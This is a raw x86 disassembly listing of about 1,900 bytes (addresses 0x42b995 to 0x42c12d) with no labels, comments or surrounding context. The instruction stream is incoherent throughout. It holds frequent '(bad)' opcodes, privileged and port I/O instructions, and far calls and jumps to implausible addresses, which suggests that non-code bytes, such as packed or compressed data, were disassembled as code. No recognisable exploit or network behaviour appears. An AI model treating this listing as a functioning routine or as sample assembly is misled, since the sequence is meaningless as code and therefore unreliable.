  42b995:	pop    ebx
  42b996:	sti    
  42b997:	jle    0x42b950
  42b999:	sub    ah,BYTE PTR ds:0xd967b5
  42b99f:	mov    edx,0xd455621
  42b9a4:	imul   edi,DWORD PTR [ebx+0x37],0xffffffa7
  42b9a8:	push   ebp
  42b9a9:	loop   0x42b92f
  42b9ab:	jbe    0x42ba0e
  42b9ad:	fld    DWORD PTR [eax]
  42b9af:	mov    edx,0x6d564c
  42b9b4:	outs   dx,DWORD PTR ds:[esi]
  42b9b5:	std    
  42b9b6:	dec    esi
  42b9b7:	lea    edi,[ebp-0x32749fff]
  42b9bd:	stos   DWORD PTR es:[edi],eax
  42b9be:	or     eax,0xfc9da300
  42b9c4:	inc    BYTE PTR [esp+ebp*2-0x4a08760f]
  42b9cb:	and    BYTE PTR [ebx+0x24750874],al
  42b9d1:	ins    DWORD PTR es:[edi],dx
  42b9d2:	jecxz  0x42b9d3
  42b9d4:	push   cs
  42b9d5:	dec    edi
  42b9d6:	(bad)  
  42b9d7:	(bad)  
  42b9d8:	dec    ebx
  42b9da:	xchg   ecx,eax
  42b9db:	mov    BYTE PTR [ebx],dl
  42b9dd:	mov    ebx,0xab35f5d9
  42b9e2:	add    DWORD PTR [eax+eax*1-0x7c],0xffffffe6
  42b9e7:	adc    DWORD PTR [edx],0x23bd54b
  42b9ed:	jp     0x42b9c8
  42b9ef:	add    cl,ch
  42b9f1:	inc    ecx
  42b9f2:	fiadd  DWORD PTR [eax]
  42b9f4:	add    al,dh
  42b9f6:	sbb    dl,ah
  42b9f8:	or     ah,BYTE PTR [ebx]
  42b9fa:	aad    0x0
  42b9fc:	push   ecx
  42b9fd:	dec    edx
  42b9fe:	ins    BYTE PTR es:[edi],dx
  42b9ff:	(bad)  
  42ba00:	call   0x434abf
  42ba05:	(bad)  
  42ba06:	lods   al,BYTE PTR ds:[esi]
  42ba07:	and    al,0x54
  42ba09:	rep stos BYTE PTR es:[edi],al
  42ba0b:	add    BYTE PTR [bp+di],bh
  42ba0e:	ins    BYTE PTR es:[edi],dx
  42ba0f:	cmp    eax,0x79a91f24
  42ba14:	retf   0x6be4
  42ba17:	inc    ebp
  42ba18:	and    al,0x57
  42ba1a:	or     eax,0xd93bc459
  42ba1f:	sbb    al,0xbf
  42ba22:	cmp    eax,0x8400286e
  42ba27:	test   BYTE PTR [esp+ebp*1],ah
  42ba2a:	lods   eax,DWORD PTR ds:[esi]
  42ba2b:	loop   0x42ba2c
  42ba2d:	(bad)  
  42ba2e:	bound  ecx,QWORD PTR [esi]
  42ba30:	and    ch,BYTE PTR [eax]
  42ba32:	xlat   BYTE PTR ds:[ebx]
  42ba33:	xor    al,0x2
  42ba35:	data16 arpl WORD PTR [eax],cx
  42ba38:	(bad)  
  42ba39:	push   ebp
  42ba3a:	gs xor eax,0x9b1d86ae
  42ba40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba41:	in     ax,0xbb
  42ba44:	jp     0x42ba91
  42ba46:	xchg   BYTE PTR [esi],bl
  42ba48:	jl     0x42ba21
  42ba4a:	retf   0xc1f1
  42ba4d:	dec    ebp
  42ba4f:	mov    edi,ebx
  42ba51:	add    BYTE PTR [edx+0x2],ah
  42ba54:	jnp    0x42ba99
  42ba56:	xchg   BYTE PTR [esi-0x38],cl
  42ba59:	push   DWORD PTR [ebp-0x548ac8be]
  42ba5f:	jle    0x42ba0d
  42ba61:	or     bl,dh
  42ba63:	int3   
  42ba64:	std    
  42ba65:	jmp    DWORD PTR [edx-0x78]
  42ba68:	add    al,0x66
  42ba6a:	bound  ecx,QWORD PTR [eax-0x21e172fc]
  42ba70:	and    al,ch
  42ba72:	fcomp  DWORD PTR ds:0x96e9facb
  42ba78:	sub    BYTE PTR [eax],ah
  42ba7a:	cmp    DWORD PTR [ebx],esi
  42ba7c:	cli    
  42ba7d:	test   BYTE PTR [ecx-0x50001fe],dh
  42ba83:	icebp  
  42ba84:	pop    eax
  42ba85:	add    BYTE PTR [edx-0x38],ah
  42ba88:	pop    es
  42ba89:	push   edi
  42ba8a:	add    BYTE PTR [ecx+0x6e24387d],dh
  42ba90:	ja     0x42ba4b
  42ba92:	out    0xdd,eax
  42ba94:	inc    edi
  42ba95:	retf   
  42ba96:	cli    
  42ba97:	out    0x41,al
  42ba99:	pop    ecx
  42ba9a:	sbb    bh,BYTE PTR [ecx+ebx*1-0x12a9dbd6]
  42baa1:	repnz or ch,ch
  42baa4:	mov    ch,0x28
  42baa6:	adc    dh,BYTE PTR [edx+0x3e3874d9]
  42baac:	mov    ecx,0xe405bf6e
  42bab1:	mov    ebp,0xbc6008ce
  42bab6:	daa    
  42bab7:	pop    esi
  42bab8:	add    dh,ah
  42baba:	adc    DWORD PTR [edx],esp
  42babc:	push   ebp
  42babd:	sub    BYTE PTR [eax+0x71],bl
  42bac0:	fdivr  QWORD PTR [ecx+0x48]
  42bac3:	rcr    DWORD PTR ds:[edi-0x501fa9c5],1
  42baca:	cmp    ecx,DWORD PTR [edi-0x6f]
  42bacd:	and    DWORD PTR [eax-0x7a],ecx
  42bad0:	enter  0xdae8,0x32
  42bad4:	jae    0x42bb3c
  42bad6:	push   eax
  42bad7:	xchg   bl,al
  42bad9:	jmp    0x42bb33
  42badb:	sub    ebx,DWORD PTR [esi-0x54]
  42bade:	daa    
  42badf:	jb     0x42bae2
  42bae1:	aas    
  42bae2:	xchg   BYTE PTR [ebx+0x7ff7deb],ch
  42bae8:	loope  0x42bacc
  42baea:	sbb    BYTE PTR [edx],ch
  42baec:	ins    BYTE PTR es:[edi],dx
  42baed:	and    eax,DWORD PTR [eax+eax*1]
  42baf0:	mov    ebp,eax
  42baf2:	shl    ebx,cl
  42baf4:	inc    ebp
  42baf5:	fstp   DWORD PTR [esi-0x55]
  42baf8:	out    0xf,al
  42bafa:	cmp    al,0x1a
  42bafc:	cld    
  42bafd:	fdiv   DWORD PTR [eax+0x12]
  42bb00:	in     eax,0x9d
  42bb02:	out    0x34,eax
  42bb04:	adc    eax,0x9fa3e681
  42bb09:	fnstenv [eax+0x3a]
  42bb0c:	pop    esi
  42bb0d:	and    edi,0x64eb4c03
  42bb13:	aas    
  42bb14:	jle    0x42baab
  42bb16:	jg     0x42baf2
  42bb18:	jecxz  0x42bb05
  42bb1a:	add    BYTE PTR [edi+0x7ae264f5],0x24
  42bb21:	add    al,BYTE PTR [ecx]
  42bb23:	out    0xbf,al
  42bb25:	fld    DWORD PTR [eax]
  42bb27:	bound  esp,QWORD PTR [edx]
  42bb29:	repz or bh,cl
  42bb2c:	popa   
  42bb2d:	fld    DWORD PTR [eax+0xda45dd]
  42bb33:	out    0xdd,al
  42bb35:	mov    esp,0x542c4ef9
  42bb3a:	retf   0xe551
  42bb3d:	in     eax,dx
  42bb3e:	cli    
  42bb3f:	ds loope 0x42bbb0
  42bb42:	and    al,0xda
  42bb44:	popa   
  42bb45:	fs or  al,0x37
  42bb48:	fmul   DWORD PTR [bp+di-0x3651]
  42bb4d:	fild   WORD PTR [ebx-0x6106071]
  42bb53:	mov    dh,0x0
  42bb55:	xchg   edx,eax
  42bb56:	or     BYTE PTR [edi+0x5c],0x7d
  42bb5a:	mov    ch,0x28
  42bb5c:	adc    DWORD PTR [esi+0x2bfefb56],eax
  42bb62:	mov    al,ds:0x2f250150
  42bb67:	sti    
  42bb68:	out    dx,al
  42bb69:	sbb    esp,DWORD PTR [eax]
  42bb6b:	jmp    0x11bb91e
  42bb70:	ins    BYTE PTR es:[edi],dx
  42bb71:	and    dh,BYTE PTR [ebp+0x55a8c124]
  42bb77:	sti    
  42bb78:	into   
  42bb79:	push   ebx
  42bb7a:	sbb    DWORD PTR [ebx+0x68],ebx
  42bb7d:	stos   BYTE PTR es:[edi],al
  42bb7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb7f:	(bad)  
  42bb80:	call   0xe947e6e6
  42bb85:	loop   0x42bb85
  42bb87:	je     0x42bba3
  42bb89:	xchg   ebp,eax
  42bb8a:	xchg   DWORD PTR [ecx+0x13],edx
  42bb8d:	xchg   BYTE PTR [edx-0x18],dl
  42bb90:	ins    BYTE PTR es:[edi],dx
  42bb91:	mov    dh,BYTE PTR [ebp-0x2ad9cfe0]
  42bb97:	or     BYTE PTR [edi+0xf9bb2f],cl
  42bb9d:	mov    ch,0x92
  42bb9f:	add    BYTE PTR [ecx],al
  42bba1:	push   ecx
  42bba2:	xlat   BYTE PTR ds:[ebx]
  42bba3:	xchg   DWORD PTR [edi+edx*1-0x1e],edi
  42bba7:	push   edx
  42bba8:	je     0x42bbe4
  42bbaa:	nop
  42bbab:	adc    BYTE PTR [ebp-0x72af2e3a],cl
  42bbb1:	xlat   BYTE PTR ds:[ebx]
  42bbb2:	mov    cl,0x18
  42bbb4:	mov    eax,DWORD PTR [eax+0xd]
  42bbb7:	rcr    ebx,0x0
  42bbba:	or     edx,esi
  42bbbc:	mov    esi,DWORD PTR [ebp+0x3]
  42bbbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bbc0:	cmc    
  42bbc1:	adc    eax,0x39e90b
  42bbc6:	jle    0x42bb79
  42bbc8:	and    al,0x18
  42bbca:	sti    
  42bbcb:	mov    ds:0x4f73cb81,eax
  42bbd0:	rol    DWORD PTR [eax],cl
  42bbd2:	mov    ebx,0x84a446a
  42bbd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbd8:	mov    edx,DWORD PTR [edi+eiz*4-0x7]
  42bbdc:	or     bl,0x53
  42bbdf:	jg     0x42bbb3
  42bbe1:	add    BYTE PTR [ebx-0x70dbc296],bh
  42bbe7:	sbb    al,0x6e
  42bbe9:	and    al,0xb7
  42bbeb:	sbb    al,0x6e
  42bbed:	and    al,0x5f
  42bbef:	sbb    al,0x6e
  42bbf1:	and    al,0x63
  42bbf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bbf4:	mov    eax,DWORD PTR [edi+edx*2-0x4f]
  42bbf8:	bound  esp,QWORD PTR [eax]
  42bbfa:	cmp    ecx,DWORD PTR ds:0xd58bc109
  42bc00:	jns    0x42bbc6
  42bc02:	sbb    DWORD PTR [eax-0xe],0x1f
  42bc06:	jl     0x42bc5a
  42bc08:	test   al,0x0
  42bc0a:	dec    ebx
  42bc0b:	fisttp QWORD PTR [ebx+0x50a12744]
  42bc11:	push   0x3a
  42bc13:	test   DWORD PTR [esp+ebp*2+0x62],ecx
  42bc17:	mov    dh,0x4
  42bc19:	sti    
  42bc1a:	push   edi
  42bc1b:	sahf   
  42bc1c:	out    dx,eax
  42bc1d:	aas    
  42bc1e:	add    BYTE PTR [edx+0x6b],ah
  42bc21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc22:	test   BYTE PTR [ecx],cl
  42bc24:	clc    
  42bc25:	or     DWORD PTR [ebp-0x5020d9e],0x3feebe77
  42bc2f:	bound  edi,QWORD PTR [ebp-0xcf2006d]
  42bc35:	push   edx
  42bc36:	or     DWORD PTR [ecx+0x5097f28f],esi
  42bc3c:	xor    bh,dh
  42bc3e:	xchg   BYTE PTR ds:0x6a73a876,dl
  42bc44:	or     al,0x26
  42bc46:	pop    dx
  42bc48:	scas   eax,DWORD PTR es:[edi]
  42bc49:	adc    cl,BYTE PTR [eax+0x5d]
  42bc4c:	ds (bad) 
  42bc4e:	cli    
  42bc4f:	outs   dx,DWORD PTR ds:[esi]
  42bc50:	mov    esi,0x6b623fed
  42bc55:	lds    eax,FWORD PTR [ebp+eax*8+0x77872946]
  42bc5c:	ss hlt 
  42bc5e:	aas    
  42bc5f:	bound  ecx,QWORD PTR [esi+ebp*8-0x74]
  42bc63:	daa    
  42bc64:	(bad)  
  42bc65:	sub    eax,0x2df61d8d
  42bc6a:	sti    
  42bc6b:	mov    ah,0x7b
  42bc6d:	inc    edx
  42bc6e:	add    bl,ch
  42bc70:	neg    DWORD PTR [ebx+0x36]
  42bc73:	fistp  QWORD PTR [ebp-0x4828b010]
  42bc79:	lock dec edi
  42bc7b:	jge    0x42bcad
  42bc7d:	adc    al,al
  42bc7f:	loope  0x42bcb7
  42bc81:	in     eax,dx
  42bc82:	mov    BYTE PTR [eax],al
  42bc84:	or     eax,0x1d395ec2
  42bc89:	mov    esi,0xbf9a1f50
  42bc8e:	in     al,dx
  42bc8f:	jae    0x42bd05
  42bc91:	(bad)  [ecx]
  42bc93:	or     eax,0xec1393a1
  42bc98:	mov    al,0x23
  42bc9a:	shl    BYTE PTR [edi+edi*2+0x620450d9],1
  42bca1:	shl    edi,1
  42bca3:	fcmovnu st,st(6)
  42bca5:	xchg   edi,eax
  42bca6:	jp     0x42bc73
  42bca8:	ficomp WORD PTR [eax]
  42bcaa:	cld    
  42bcab:	dec    ebp
  42bcad:	fnstcw WORD PTR [esi-0xc]
  42bcb0:	fcom   QWORD PTR [edi]
  42bcb2:	push   eax
  42bcb3:	add    BYTE PTR [ecx+0x1c7ee7d9],0xf1
  42bcba:	adc    al,0x8a
  42bcbc:	sti    
  42bcbd:	out    0x15,eax
  42bcbf:	les    ebx,FWORD PTR [eax+0x6d2ea487]
  42bcc5:	sbb    eax,0x548ec6b4
  42bcca:	inc    esp
  42bccb:	xchg   ecx,eax
  42bccd:	loopne 0x42bd35
  42bccf:	fdivr  DWORD PTR ds:0x3131bc8c
  42bcd5:	icebp  
  42bcd6:	in     eax,dx
  42bcd7:	std    
  42bcd8:	retf   
  42bcd9:	out    0x55,eax
  42bcdb:	push   es
  42bcdc:	sti    
  42bcdd:	mov    ecx,0xf12e07f4
  42bce2:	ins    BYTE PTR es:[edi],dx
  42bce3:	mov    edx,0x4070e7a8
  42bce8:	add    BYTE PTR [esi-0x3b],bh
  42bceb:	ins    BYTE PTR es:[edi],dx
  42bcec:	les    edx,FWORD PTR [esi]
  42bcee:	fbld   TBYTE PTR [edi-0x18260324]
  42bcf4:	add    eax,DWORD PTR [edx+ebp*8]
  42bcf7:	(bad)  
  42bcf9:	ror    edx,1
  42bcfb:	daa    
  42bcfc:	add    al,0x12
  42bcfe:	call   0x99aa48f7
  42bd03:	out    0xdb,eax
  42bd05:	fst    QWORD PTR [edi]
  42bd07:	mov    ebx,0x118e1ca
  42bd0c:	out    0xdd,al
  42bd0e:	call   0xe821:0xf061e8ff
  42bd15:	popa   
  42bd16:	fld    DWORD PTR [ebp+0x4fc98235]
  42bd1c:	fs jne 0x42bcdc
  42bd1f:	sbb    BYTE PTR [eax],bh
  42bd21:	mov    ch,0x1e
  42bd23:	jmp    0xfa299a07
  42bd28:	jb     0x42bd33
  42bd2a:	push   0x5b1876fb
  42bd2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd30:	jmp    0xcdc09696
  42bd35:	ins    DWORD PTR es:[edi],dx
  42bd36:	mov    ecx,0x5451d300
  42bd3b:	inc    ebp
  42bd3c:	or     eax,0xb9007f5e
  42bd41:	sbb    DWORD PTR [edi],ebp
  42bd43:	imul   ebp,eax,0x61
  42bd46:	pop    esi
  42bd47:	jne    0x42bd4e
  42bd49:	ds data16 (bad) 
  42bd4c:	in     eax,0x0
  42bd4e:	in     al,0xe5
  42bd50:	add    al,0xb4
  42bd52:	sbb    eax,0xd22632e2
  42bd57:	(bad)  
  42bd58:	or     eax,0xf86661a9
  42bd5d:	leave  
  42bd5e:	adc    dh,BYTE PTR [edx-0x7b]
  42bd61:	iret   
  42bd62:	cmp    cl,BYTE PTR [edx+0xe57cd24]
  42bd68:	xchg   esi,ebp
  42bd6a:	daa    
  42bd6b:	sbb    DWORD PTR ds:0x71d065b9,ebp
  42bd71:	in     eax,0x17
  42bd73:	push   ds
  42bd74:	out    0x1,al
  42bd76:	or     al,0x19
  42bd78:	sub    eax,0x71dc5a28
  42bd7d:	in     al,dx
  42bd7e:	loope  0x42bd99
  42bd80:	enter  0x77c2,0x5c
  42bd84:	rol    BYTE PTR [eax],0x57
  42bd87:	jp     0x42bdc5
  42bd89:	add    eax,0xc179f52c
  42bd8e:	loop   0x42bde8
  42bd90:	shl    DWORD PTR [esp+edi*1-0x1e],cl
  42bd94:	add    eax,DWORD PTR [edx+0x29]
  42bd97:	xor    eax,0xf9fb07e3
  42bd9c:	std    
  42bd9d:	xchg   DWORD PTR [ecx+0x4d],eax
  42bda0:	add    DWORD PTR [edi-0x20],eax
  42bda3:	and    eax,0xc22ec97e
  42bda8:	test   bl,bl
  42bdaa:	cs (bad) 
  42bdac:	mov    eax,DWORD PTR [edi+ebp*1-0x2a]
  42bdb0:	mov    ebp,0xba1f0044
  42bdb5:	(bad)  
  42bdb6:	(bad)  
  42bdb7:	sti    
  42bdb8:	fld    DWORD PTR [ecx+0x47651356]
  42bdbe:	add    al,0xbb
  42bdc0:	adc    BYTE PTR [eax+0xc],dh
  42bdc3:	mov    ds:0xa4fff8ff,eax
  42bdc8:	outs   dx,BYTE PTR ds:[esi]
  42bdc9:	inc    ebp
  42bdca:	and    al,0x5b
  42bdcc:	add    eax,0x1094fdb7
  42bdd1:	adc    ebp,0x40
  42bdd4:	and    esp,edx
  42bdd6:	jl     0x42bdb0
  42bdd8:	fld    DWORD PTR [eax]
  42bdda:	lea    ecx,[edi]
  42bddc:	(bad)  
  42bddd:	adc    al,ch
  42bddf:	loope  0x42bdbf
  42bde1:	cmc    
  42bde2:	(bad)  
  42bde3:	ds sbb eax,0x10948507
  42bde9:	idiv   edi
  42bdeb:	mov    eax,ss:0xea631824
  42bdf1:	fild   WORD PTR [eax]
  42bdf3:	mov    esp,DWORD PTR [ecx+ebp*8-0x7b]
  42bdf7:	lods   eax,DWORD PTR ds:[esi]
  42bdf8:	xchg   ebp,eax
  42bdf9:	cmp    eax,0x18b9278b
  42bdfe:	test   DWORD PTR [edx+0xf],esp
  42be01:	dec    edx
  42be02:	cmp    cl,ch
  42be04:	xor    eax,0xd0466385
  42be09:	add    al,0x66
  42be0b:	adc    dh,BYTE PTR [ebp+0x39]
  42be0e:	and    al,0x8a
  42be10:	cwde   
  42be11:	add    al,0x50
  42be13:	dec    edx
  42be14:	sbb    DWORD PTR [ebx+0x1],edx
  42be17:	add    BYTE PTR [edx+0x6f],ah
  42be1a:	mov    ecx,0x20bed70b
  42be1f:	xor    al,0xc8
  42be21:	or     BYTE PTR ds:0x21ee3550,dh
  42be27:	adc    ah,BYTE PTR [edx+0x56c384f2]
  42be2d:	jne    0x42be60
  42be2f:	and    al,0x42
  42be31:	pop    edx
  42be32:	and    bh,ch
  42be34:	adc    eax,0x48be8474
  42be39:	sub    ecx,DWORD PTR [ebx-0x3a]
  42be3c:	fnstenv [ebp+edx*8-0x20d7f00]
  42be43:	xor    cl,BYTE PTR [di]
  42be46:	(bad)  
  42be47:	(bad)  
  42be48:	in     eax,dx
  42be49:	in     eax,0xcd
  42be4b:	ins    DWORD PTR es:[edi],dx
  42be4c:	sahf   
  42be4d:	repnz enter 0xea14,0x0
  42be52:	add    BYTE PTR ds:[edi+0x62fffef0],dl
  42be59:	inc    esi
  42be5a:	jg     0x42bde2
  42be5c:	push   ss
  42be5d:	push   ds
  42be5e:	loop   0x42be47
  42be60:	fmul   QWORD PTR [esi-0x4d8e0539]
  42be66:	sub    BYTE PTR [edx+0xf],bl
  42be69:	aaa    
  42be6a:	jge    0x42be50
  42be6c:	pop    es
  42be6d:	mov    al,0xf9
  42be6f:	jmp    eax
  42be71:	fidivr WORD PTR [ecx]
  42be73:	dec    edi
  42be74:	das    
  42be75:	dec    esp
  42be76:	xor    DWORD PTR [ebp-0x13f426da],ecx
  42be7c:	add    BYTE PTR ds:0x1e2053e4,dl
  42be82:	icebp  
  42be83:	or     cl,ch
  42be85:	js     0x42be6b
  42be87:	push   ss
  42be88:	stos   DWORD PTR es:[edi],eax
  42be89:	ficom  WORD PTR [ebp-0x7a250bf5]
  42be8f:	add    esi,eax
  42be91:	inc    ebp
  42be92:	push   0x526204cc
  42be97:	and    al,0x20
  42be99:	stos   BYTE PTR es:[edi],al
  42be9a:	pop    esi
  42be9b:	test   al,0x51
  42be9d:	jb     0x42be47
  42be9f:	mov    ch,0x42
  42bea1:	out    dx,eax
  42bea2:	xchg   esp,eax
  42bea3:	retf   
  42bea4:	jmp    0x42bee3
  42bea6:	inc    esp
  42bea7:	test   DWORD PTR [edx+eiz*2],eax
  42beaa:	dec    edi
  42beab:	mov    al,ds:0xfc50abdb
  42beb0:	pop    ds
  42beb1:	jb     0x42bf22
  42beb3:	lods   eax,DWORD PTR ds:[esi]
  42beb4:	jp     0x42beb2
  42beb6:	and    BYTE PTR [edi+eax*8-0x6f],0xae
  42bebb:	je     0x42bf11
  42bebd:	push   eax
  42bebe:	outs   dx,DWORD PTR ds:[esi]
  42bebf:	pop    edx
  42bec0:	jns    0x42be6d
  42bec2:	adc    esp,DWORD PTR [ebp+0x30]
  42bec5:	ds mov ecx,0xe3cdb73f
  42becb:	inc    edx
  42becc:	and    DWORD PTR [ebp-0x1aa22b93],0x1e0ac9da
  42bed6:	mov    ebp,0x7b655099
  42bedb:	outs   dx,BYTE PTR ds:[esi]
  42bedc:	les    edi,FWORD PTR ds:[ebp-0x22]
  42bee0:	aas    
  42bee1:	add    BYTE PTR [esi+0x1f059b89],al
  42bee7:	pop    eax
  42bee8:	and    cl,BYTE PTR [edx]
  42beea:	jne    0x42bee0
  42beec:	jne    0x42bea2
  42beee:	aas    
  42beef:	lahf   
  42bef0:	cdq    
  42bef1:	pop    edx
  42bef2:	cdq    
  42bef3:	sahf   
  42bef4:	add    BYTE PTR [edi-0x32db67e6],bl
  42befa:	push   ecx
  42befb:	push   esi
  42befc:	push   ebp
  42befd:	or     eax,0x54d5476
  42bf02:	push   es
  42bf03:	push   edx
  42bf04:	jge    0x42bf13
  42bf06:	xchg   bl,bh
  42bf08:	mov    ah,0x4b
  42bf0a:	data16 fld DWORD PTR [ebx-0x7a31ea57]
  42bf11:	and    eax,0x9b2dc982
  42bf16:	and    al,0xe9
  42bf18:	test   DWORD PTR ds:0xb9858182,ebx
  42bf1e:	sub    DWORD PTR [ebx+0x5b61e9e3],edi
  42bf24:	fldenv [edx+0x6d]
  42bf27:	mov    ebp,0x853b8158
  42bf2c:	add    cl,ch
  42bf2e:	stos   BYTE PTR es:[edi],al
  42bf2f:	mov    fs,WORD PTR [edx*8-0x16287dc7]
  42bf36:	popa   
  42bf37:	pop    ebx
  42bf38:	mov    esi,0x5584440e
  42bf3d:	push   0xffffffc5
  42bf3f:	xchg   esi,eax
  42bf40:	mov    esi,0x858c61e5
  42bf45:	inc    ebp
  42bf46:	add    al,ah
  42bf48:	idiv   al
  42bf4a:	push   0x15
  42bf4c:	pop    edi
  42bf4d:	dec    ebp
  42bf4e:	lahf   
  42bf4f:	data16 mov fs,WORD PTR [ebx*8+0x64d5b28c]
  42bf57:	lea    edi,[ebp+0x519b621c]
  42bf5d:	pop    ebp
  42bf5e:	int    0x69
  42bf60:	icebp  
  42bf61:	mov    eax,ds:0x85d96105
  42bf66:	sbb    edx,esp
  42bf68:	call   0xd8ab2476
  42bf6d:	add    BYTE PTR [eax],al
  42bf6f:	mov    ebx,0xab24455f
  42bf74:	popa   
  42bf75:	cmp    eax,0xf5a6bf24
  42bf7a:	jne    0x42beff
  42bf7c:	pop    edi
  42bf7d:	into   
  42bf7e:	call   0x39d4ef
  42bf83:	lock cwde 
  42bf85:	and    al,0x1c
  42bf87:	add    BYTE PTR [eax],ch
  42bf89:	sbb    BYTE PTR [edi+eiz*2-0x18],0x88
  42bf8e:	push   esp
  42bf8f:	push   edi
  42bf90:	mov    ebp,0xe9674487
  42bf95:	test   al,al
  42bf97:	cmp    al,0x62
  42bf99:	push   cs
  42bf9a:	add    DWORD PTR [ebx],edi
  42bf9c:	(bad)  
  42bf9d:	or     eax,0x3341e70
  42bfa3:	or     eax,0x2724455e
  42bfa8:	imul   edx,DWORD PTR [edi+0x4],0x0
  42bfac:	mov    gs,WORD PTR [ebx-0x468076ce]
  42bfb2:	sbb    BYTE PTR [ebx-0x74db4681],cl
  42bfb8:	lea    ebx,[esi+0x45]
  42bfbb:	and    al,0x1f
  42bfbd:	test   BYTE PTR [ecx-0x44],bh
  42bfc0:	push   edi
  42bfc1:	push   edi
  42bfc2:	cli    
  42bfc3:	dec    DWORD PTR [ebx]
  42bfc5:	(bad)  
  42bfc6:	je     0x42bfde
  42bfc8:	and    eax,0x79247d61
  42bfcd:	fld    QWORD PTR [eax]
  42bfcf:	add    BYTE PTR ds:0x50363dcf,dl
  42bfd5:	cdq    
  42bfd6:	and    al,0x14
  42bfd8:	mov    esp,0xbb009f62
  42bfdd:	aad    0x5e
  42bfdf:	cmp    DWORD PTR [edi],0xffffffb9
  42bfe2:	test   BYTE PTR [eax],al
  42bfe4:	retf   
  42bfe5:	aad    0x0
  42bfe7:	je     0x42c04b
  42bfe9:	loop   0x42c046
  42bfeb:	xchg   esi,esp
  42bfed:	sbb    edi,DWORD PTR [edx-0x1]
  42bff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bff1:	out    dx,eax
  42bff2:	pop    ebx
  42bff3:	cmp    DWORD PTR ds:0x3e437918,esp
  42bff9:	add    al,0xf5
  42bffb:	test   bh,ah
  42bffd:	out    dx,eax
  42bffe:	std    
  42bfff:	call   edi
  42c001:	mov    bl,0x20
  42c003:	push   eax
  42c004:	adc    bl,BYTE PTR [edx-0x3fc1bc45]
  42c00a:	add    esp,DWORD PTR [esi]
  42c00c:	fstp   TBYTE PTR [ebx+0x65003420]
  42c012:	add    al,0xee
  42c014:	push   cs
  42c015:	mov    ds:0x7e4376f2,al
  42c01a:	fidivr WORD PTR [eax+0x43]
  42c01d:	xchg   BYTE PTR [edx],cl
  42c01f:	mov    DWORD PTR cs:[esi+0x57fb020e],ebx
  42c026:	loop   0x42c018
  42c028:	aas    
  42c029:	bound  esi,QWORD PTR [ebp+0x31]
  42c02c:	and    al,0x7e
  42c02e:	jns    0x42c069
  42c030:	and    al,0x66
  42c032:	das    
  42c033:	cmp    ah,BYTE PTR [edx+ebp*4]
  42c036:	idiv   ebp
  42c038:	jmp    DWORD PTR [edx+0x5a]
  42c03b:	gs mov ecx,0xbf79f262
  42c041:	mov    ?,WORD PTR [edi-0x118f05f9]
  42c047:	js     0x42c09c
  42c049:	ds out 0x30,al
  42c04c:	xchg   DWORD PTR ds:0x625def9b,ebx
  42c052:	bnd js 0x42c098
  42c055:	xchg   BYTE PTR [esi],al
  42c057:	jns    0x42c0ac
  42c059:	jle    0x42c02d
  42c05b:	ja     0x42c0a8
  42c05d:	xchg   BYTE PTR [esi],cl
  42c05f:	sub    DWORD PTR [ebx+0x7e],0x2a09ffd9
  42c066:	pop    esp
  42c067:	wbinvd 
  42c069:	sbb    al,0x5c
  42c06b:	add    ecx,DWORD PTR [ecx]
  42c06d:	fist   DWORD PTR [ebp-0xddb103d]
  42c073:	mov    ebp,0xb52100bd
  42c078:	(bad)  
  42c079:	add    bh,BYTE PTR [ebp-0x33]
  42c07c:	pop    esi
  42c07d:	aas    
  42c07e:	inc    esi
  42c07f:	lds    ebx,FWORD PTR [esi+0x2f]
  42c082:	ds mov ecx,0xbd46506e
  42c088:	dec    ax
  42c08a:	ror    DWORD PTR ds:0xe19ed46,0x87
  42c092:	mov    al,ds:0x865870a3
  42c097:	mov    ecx,0xbd7e5070
  42c09c:	out    dx,al
  42c09d:	rcr    DWORD PTR [eax+0x5b],cl
  42c0a0:	int    0xc2
  42c0a2:	dec    eax
  42c0a3:	loopne 0x42c10c
  42c0a5:	inc    eax
  42c0a6:	xchg   ah,cl
  42c0a8:	out    0x2d,eax
  42c0aa:	bound  eax,QWORD PTR [ebx+ebx*1+0x5f08e50f]
  42c0b1:	sar    BYTE PTR ds:0x62048744,cl
  42c0b7:	push   ebx
  42c0b8:	mov    al,ds:0x62f12b8f
  42c0bd:	and    al,0x62
  42c0bf:	fstp   DWORD PTR [eax+edx*2+0x3e]
  42c0c3:	mov    cl,0x4f
  42c0c5:	rcl    BYTE PTR [eax],cl
  42c0c7:	(bad)  
  42c0c9:	lea    esi,[edi+edi*2-0xa1aa14f]
  42c0d0:	lods   al,BYTE PTR ds:[esi]
  42c0d1:	lds    esp,FWORD PTR [ecx-0x27]
  42c0d4:	call   0x38:0x3155d78e
  42c0db:	dec    eax
  42c0dc:	push   ebx
  42c0dd:	add    eax,ebp
  42c0df:	in     eax,0x1f
  42c0e1:	jne    0x42c0a4
  42c0e3:	int3   
  42c0e4:	or     eax,0xa3f47253
  42c0e9:	xor    BYTE PTR [esi+ecx*2-0x5217bfa9],dl
  42c0f0:	addr16 je 0x42c0d8
  42c0f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0f4:	xchg   DWORD PTR [ebx-0x11],esi
  42c0f7:	dec    edi
  42c0f8:	aad    0x7d
  42c0fa:	sub    BYTE PTR [ebx+eax*4+0x4d],bl
  42c0fe:	arpl   WORD PTR [edi+0x4e],bp
  42c101:	sbb    DWORD PTR ds:[edx-0x2e],esp
  42c105:	jno    0x42c0f7
  42c107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c108:	std    
  42c109:	add    al,0x47
  42c10b:	(bad)  
  42c10d:	xor    dl,al
  42c10f:	inc    ebx
  42c110:	dec    esi
  42c111:	mov    fs,WORD PTR ds:[ebp-0x2c]
  42c115:	jno    0x42c107
  42c117:	es std 
  42c119:	add    al,0x47
  42c11b:	(bad)  
  42c11d:	xor    edx,eax
  42c11f:	jae    0x42c16d
  42c121:	ds dec esi
  42c123:	inc    ebp
  42c124:	(bad)  
  42c125:	jno    0x42c124
  42c127:	es std 
  42c129:	add    al,0x7
  42c12b:	(bad)  
  42c12d:	push   ecx
